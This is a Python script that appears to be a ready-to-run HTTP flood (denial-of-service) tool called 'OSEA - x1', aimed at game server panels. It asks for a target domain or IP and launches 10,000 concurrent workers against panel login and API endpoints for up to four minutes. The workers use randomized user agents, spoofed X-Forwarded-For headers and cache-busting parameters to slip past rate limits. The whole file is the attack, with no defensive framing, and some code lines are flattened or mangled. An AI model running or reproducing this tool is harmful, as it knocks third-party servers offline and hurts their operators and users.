import aiohttp import asyncio import random import time from colorama import Fore, Style, init

init(autoreset=True)

class OseaHawk: def init(self): self.running = False self.sent = 0 self.failed = 0

def display_banner(self):
    print(Fore.RED + """

+---------------------------------------+ |           -- OSEA - x1 --           | |        Developed by @Necuix           | +---------------------------------------+ |         Method: Game Panel Bust       | +---------------------------------------+ """ + Style.RESET_ALL)

async def http_brute_force(self, protocol, target, duration):
    self.running = True
    self.sent = 0
    self.failed = 0
    timeout = time.time() + duration

    paths = [
        "/api/client",
        "/auth/login",
        "/api/me",
        "/server",
        "/api/application/servers",
        "/daemon/server"
    ]

    connector = aiohttp.TCPConnector(limit=0, ssl=(protocol == "https"))
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(self.worker(session, protocol, target, timeout, paths)) for _ in range(10000)]
        await asyncio.gather(*tasks)

async def worker(self, session, protocol, target, timeout, paths):
    while time.time() < timeout and self.running:
        try:
            path = random.choice(paths)
            url = f"{protocol}://{target}{path}?_={random.randint(1000, 999999)}"
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,599)}",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Referer": f"{protocol}://{target}/auth/login"
            }
            async with session.get(url, headers=headers, timeout=10) as r:
                if r.status in (200, 403, 500):
                    self.sent += 1
                else:
                    self.failed += 1
        except:
            self.failed += 1

def start(self):
    self.display_banner()
    target = input(Fore.RED + "Target Domain or IP (without http/https): " + Style.RESET_ALL).strip()
    protocol = input("Protocol (http or https): ").strip().lower()
    if protocol not in ["http", "https"]:
        print(Fore.RED + "Invalid protocol. Must be http or https." + Style.RESET_ALL)
        return

    duration = int(input("Duration in seconds (max 240): ").strip())
    if duration > 240:
        print(Fore.YELLOW + "Duration too long. Limiting to 240 seconds." + Style.RESET_ALL)
        duration = 240

    print(Fore.RED + f"\n[!] Game Panel Bust started on {protocol}://{target} for {duration} seconds...\n")
    asyncio.run(self.http_brute_force(protocol, target, duration))
    print(Fore.GREEN + f"\n[✓] Finished. Requests sent: {self.sent} | Failed: {self.failed}\n")
    self.running = False

if name == 'main': OseaHawk().start()

# coded by @necuix 
